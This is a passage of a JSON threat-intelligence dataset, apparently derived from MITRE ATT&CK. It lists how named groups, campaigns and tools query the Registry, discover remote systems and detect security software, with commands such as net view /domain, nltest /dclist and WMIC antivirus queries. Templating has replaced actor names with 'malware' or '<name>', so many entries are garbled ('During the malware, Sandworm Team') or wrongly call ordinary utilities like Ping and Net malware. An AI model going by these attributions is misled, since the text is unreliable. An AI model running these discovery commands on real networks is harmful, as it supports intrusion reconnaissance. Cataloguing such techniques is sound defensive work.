                "Description": "malware can use the GetRegValue function to check Registry keys within HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.[87]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware has the ability to query the Registry to detect a key specific to VMware.[88]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware attempts to determine the installed version of .NET by querying the Registry.[89]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has looked in the registry to find the default browser path.[90]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware searches the Registry for indicators of security programs.[91]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts.[92]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can search for the HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System Registry key to gather system information.[93]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware enumerates Registry keys associated with event logs.[94]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can query the Registry on compromised hosts using RegQueryValueExA.[95]"
            },
            "S0560": {
                "ID": "S0560",
                "Name": "TEARDROP",
                "Description": "malware checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload.[92][96]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "A malware tool can read and decrypt stored Registry values.[97]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware can query the Registry for its configuration information.[98]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[38] malware has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .[99]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can query the Registry, typically HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, to find the key and path to decrypt and load its kernel driver and kernel driver loader.[100]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used Reg to query the Registry for installed programs.[101][102]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can use the Registry for code updates and to collect credentials.[103]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware checks the system for certain Registry keys.[104]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has queried the Registry on compromised systems, reg query hklm\\software\\, for information on installed software.[105]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.[106]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can query the Registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value OracleOcilib exists.[107]"
            },
            "S0155": {
                "ID": "S0155",
                "Name": "WINDSHIELD",
                "Description": "malware can gather Registry values.[108]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can search registry keys to identify antivirus programs on an compromised host.[109]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware executes the reg query command to obtain information in the Registry.[110]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware checks for the existence of a Registry key and if it contains certain values.[111]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used a tool to query the Registry for proxy settings.[112]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can query the netsvc group value data located in the svchost group Registry key.[113]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware can search the registry of a compromised host.[114]"
            }
        }
    },
    "T1018": {
        "ttp_name": "Remote System Discovery",
        "ttp_id": "T1018",
        "href": "/techniques/T1018",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.Adversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).[1][2]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. [3]"
            },
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[4]"
            },
            "S0552": {
                "ID": "S0552",
                "Name": "AdFind",
                "Description": "malware has the ability to query Active Directory for computers.[5][6][7][8]"
            },
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.[9]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can detect the existence of remote systems.[10][11]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has enumerated DC servers using the command net group \"Domain Controllers\" /domain. The group has also used the ping command.[12]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used NBTscan and custom tools to discover remote systems.[13][14][15]"
            },
            "S0099": {
                "ID": "S0099",
                "Name": "Arp",
                "Description": "malware can be used to display a host's ARP cache, which may include address resolutions for remote systems.[16][17]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware can enumerate and map ICS-specific systems in victim environments.[18]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can use a PowerShell object such as, System.Net.NetworkInformation.Ping to ping a computer.[19]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can enumerate remote systems using  Net View.[20]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can use net view to discover remote systems.[21]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can use LDAP queries to connect to AD and iterate over connected workstations.[22]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.[23]"
            },
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware can enumerate and collect the properties of domain computers, including domain controllers.[24]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware typically use ping and Net to enumerate systems.[25]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used the commands net view /all /domain and ping to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.[26]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware uses the net view command.[27]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has utilized various scans and queries to find domain controllers and remote services in the target environment.[28]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.[29][30][31]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware runs the net view command"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware has the ability to discover hosts on a target network.[32]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can discover active IP addresses, along with the machine name, within a targeted network.[33]"
            },
            "G0009": {
                "ID": "G0009",
                "Name": "Deep Panda",
                "Description": "malware has used ping to identify other machines of interest.[34]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can use the ARP table to find remote hosts to scan.[35]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has likely obtained a list of hosts in the victim environment.[36]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can search for other machines connected to compromised host and attempt to map the network.[37]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware used the command powershell \"Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr \"Address\"\" to find the network information of successfully logged-in accounts to discovery addresses of other machines. malware has also used multiple scanning tools to discover other machines within the same compromised network.[38]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the net view command on the victim\u2019s machine.[39]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware has used the open source tool Essential NetTools to map the network and build a list of targets.[40]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[41]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has used dsquery and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers.[42][43]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to execute net view on a targeted system.[44]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used Angry IP Scanner to detect remote systems.[45]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can collect information about hosts on the victim network.[46]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used several tools and batch files to map victims' internal networks.[47]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems.[48]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has enumerated domain controllers using net group \"Domain computers\" and nltest /dclist.[49]"
            },
            "S0698": {
                "ID": "S0698",
                "Name": "HermeticWizard",
                "Description": "malware can find machines on the local network by gathering known local IP addresses through DNSGetCacheDataTable, GetIpNetTable,WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY),NetServerEnum,GetTcpTable, and GetAdaptersAddresses.[50]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has used net view to enumerate domain machines.[51]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.[52]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware can enumerate remote computers in the compromised network.[53]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has used network scanning and enumeration tools, including Ping.[54]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has used a script to parse files like /etc/hosts and SSH known_hosts to discover remote systems.[55]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of available servers with the command net view.[56]"
            },
            "G0077": {
                "ID": "G0077",
                "Name": "Leafminer",
                "Description": "malware used Microsoft\u2019s Sysinternals tools to gather detailed information about remote systems.[57]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used Ping for discovery on targeted networks.[58]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware uses scripts to enumerate IP ranges on the victim network. malware has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network.[59][60]"
            },
            "S0233": {
                "ID": "S0233",
                "Name": "MURKYTOP",
                "Description": "malware has the capability to identify remote hosts on connected networks.[61]"
            },
            "G0019": {
                "ID": "G0019",
                "Name": "Naikon",
                "Description": "malware has used a netbios scanner for remote machine identification.[62]"
            },
            "S0590": {
                "ID": "S0590",
                "Name": "NBTscan",
                "Description": "malware can list NetBIOS computer names.[63][64]"
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "Commands such as net view can be used in malware to gather information about available remote systems.[65]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can identify remote hosts on connected networks.[66]"
            },
            "S0359": {
                "ID": "S0359",
                "Name": "Nltest",
                "Description": "malware may be used to enumerate remote domain controllers using options such as /dclist and /dsgetdc.[67]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware uses Windows Management Instrumentation to enumerate all systems in the network.[68]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net view and ping commands as part of their advanced reconnaissance.[69]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used nbtscan and ping to discover remote systems, as well as dsquery subnet on a domain controller to retrieve all subnets in the Active Directory.[70]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware performs a connection test to discover remote systems in the network[10]"
            },
            "S0097": {
                "ID": "S0097",
                "Name": "Ping",
                "Description": "malware can be used to identify remote systems within a network.[71]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware used Nmap for remote system discovery.[72]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can identify remote systems through the net view command.[73][74][75]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware runs the net view /domain and net view commands.[76]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can ping or traceroute a remote host.[77]"
            },
            "S0684": {
                "ID": "S0684",
                "Name": "ROADTools",
                "Description": "malware can enumerate Azure AD systems and devices.[78]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.[79]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.[80][4]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware can enumerate remote systems, such as VMware vCenter infrastructure.[81]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware scans the C-class subnet of the IPs on the victim's interfaces.[82]"
            },
            "S0063": {
                "ID": "S0063",
                "Name": "SHOTPUT",
                "Description": "malware has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.[83]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.[84]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can enumerate and collect the properties of domain computers.[85]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used AdFind to enumerate remote systems.[86]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware can identify payment systems, payment gateways, and ATM systems in compromised environments.[87]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware may use net view /domain to display hostnames of available systems on a network.[88]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "The malware command and execution module can perform target system enumeration.[89]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has used the net view command.[90]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has used ping %REMOTE_HOST% for post exploit discovery.[91]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can enumerate computers and network devices.[92]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. malware has also used net group \"Domain Computers\" /domain, net group \"Domain Controllers\" /domain, and net group \"Exchange Servers\" /domain to enumerate domain computers, including the organization's DC and Exchange Server.[39][93]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can use net view to gather information about remote systems.[94]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has used multiple methods, including Ping, to enumerate systems on compromised networks.[95][96]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware scans its local network segment for remote systems to try to exploit and copy itself to.[97]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. malware has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.[7][98][99][5][100][101]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware uses the net view command for discovery.[102]"
            }
        }
    },
    "T1518": {
        "ttp_name": "Software Discovery",
        "ttp_id": "T1518",
        "href": "/techniques/T1518",
        "subtechnique": {
            "001": {
                "name": "Security Software Discovery",
                "href": "/techniques/T1518/001",
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
                "Procedure": {
                    "S0469": {
                        "ID": "S0469",
                        "Name": "ABK",
                        "Description": "<name> has the ability to identify the installed anti-virus product on the compromised host.[1]"
                    },
                    "S1028": {
                        "ID": "S1028",
                        "Name": "Action RAT",
                        "Description": "<name> can identify AV products on an infected host using the following command: cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List.[2]"
                    },
                    "S1025": {
                        "ID": "S1025",
                        "Name": "Amadey",
                        "Description": "<name> has checked for a variety of antivirus products.[3][4]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has identified security software, configurations, defensive tools, and sensors installed on a compromised system.[5]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.[6]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> checks for the presence of Avast antivirus in the C:\\Program\\Files\\ folder. [7]"
                    },
                    "S1029": {
                        "ID": "S1029",
                        "Name": "AuTo Stealer",
                        "Description": "<name> has the ability to collect information about installed AV products from an infected host.[2]"
                    },
                    "S0473": {
                        "ID": "S0473",
                        "Name": "Avenger",
                        "Description": "<name> has the ability to identify installed anti-virus products on a compromised host.[1]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> uses WMI to enumerate installed security products in the victim\u2019s environment.[8]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can identify the installed antivirus engine.[9]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can collect a list of anti-virus products installed on a machine.[10]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can detect EDR userland hooks.[11]"
                    },
                    "S0471": {
                        "ID": "S0471",
                        "Name": "build_downer",
                        "Description": "<name> has the ability to detect if the infected host is running an anti-virus process.[1]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can identify specific analytical tools based on running processes.[12][13][14]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has queried the infected system's registry searching for specific registry keys associated with antivirus products.[15]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> checks for antivirus and forensics software.[16]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> can search for processes with antivirus and antimalware product names.[17][18]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.[19]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> attempts to detect several anti-virus products.[20]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.[21]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "The main <name> dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.[22]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> contains a command to collect information about anti-virus software on the victim.[23][24]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> looks for various security products by process name using hard-coded values in the malware. <name> will not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified, or if runtime checks identify the presence of Kaspersky anti-virus. <name> will initiate a new thread if certain security products are identified on the victim, and recreate any malicious files associated with it if it determines they were removed by security software in a new system location.[25]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has searched for anti-malware strings and anti-virus processes running on the system.[26][27]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can check for the Kaspersky Anti-Virus suite.[28]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can search for anti-virus products on the system.[29]"
                    },
                    "S0472": {
                        "ID": "S0472",
                        "Name": "down_new",
                        "Description": "<name> has the ability to detect anti-virus products and processes on a compromised host.[1]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> checks for the existence of anti-virus.[30]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can enumerate antivirus software on the target.[31]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> searches for anti-malware services running on the victim\u2019s machine and terminates itself if it finds them.[32]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has been observed querying installed antivirus software.[33]"
                    },
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> can search for anti-virus products on the system.[34]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "<name> checks for processes associated with anti-virus vendors.[35]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> checks for installed security software like antivirus and firewall.[36]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> has checked for AV software as part of its persistence process.[37]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used Registry keys to detect and avoid executing in potential sandboxes.[38]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> probes the system to check for antimalware processes.[39][40]"
                    },
                    "S0143": {
                        "ID": "S0143",
                        "Name": "Flame",
                        "Description": "<name> identifies security software such as antivirus through the Security module.[41][42]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> will attempt to detect anti-virus products during the initial infection.[43]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used WMI queries to determine if analysis tools were running on a compromised system.[44]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can identify the processes for Bkav antivirus.[45]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can check for the presence of specific security products.[46]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> checks for anti-malware products and processes.[47]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.[48][48]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can check for the presence of network sniffers, AV, and BitDefender firewall.[49]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.[50]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can list security software, such as by using WMIC to identify anti-virus products installed on the victim\u2019s machine and to obtain firewall details.[51][52]"
                    },
                    "S0088": {
                        "ID": "S0088",
                        "Name": "Kasidet",
                        "Description": "<name> has the ability to identify any anti-virus installed on the infected system.[53]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2 \u2013 classname antivirusproduct.[54]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> has the ability to check for the presence of Kaspersky security software.[55]"
                    },
                    "S0680": {
                        "ID": "S0680",
                        "Name": "LitePower",
                        "Description": "<name> can identify installed AV software.[37]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> can search for processes associated with an anti-virus product from list.[56]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can search for a variety of security software programs, EDR systems, and malware analysis tools.[57][58]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> collects the installed antivirus on the victim machine.[59]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can check for running processes on the victim\u2019s machine to look for Kaspersky and Bitdefender antivirus products.[60]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> collects a list of installed antivirus software from the victim\u2019s system.[61][62]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> has the ability to search for Kaspersky Antivirus on a victim's machine.[63]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> searches for anti-virus software and firewall products installed on the victim\u2019s machine using WMI.[64][65]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> can list installed security products in the victim\u2019s environment.[66][67]"
                    },
                    "S0553": {
                        "ID": "S0553",
                        "Name": "MoleNet",
                        "Description": "<name> can use WMI commands to check the system for firewall and antivirus software.[68]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> can obtain information on installed anti-malware programs.[69]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name>'s installer searches the Registry and system to see if specific antivirus tools are installed on the system.[70]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.[71]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> uses commands such as netsh advfirewall firewall to discover local firewall settings.[72]"
                    },
                    "S0108": {
                        "ID": "S0108",
                        "Name": "netsh",
                        "Description": "<name> can be used to discover system firewall settings.[73][74]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "<name> can detect and terminate active security software-related processes on infected systems.[75]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> determines if specific antivirus programs are running on an infected host machine.[76]"
                    },
                    "C0014": {
                        "ID": "C0014",
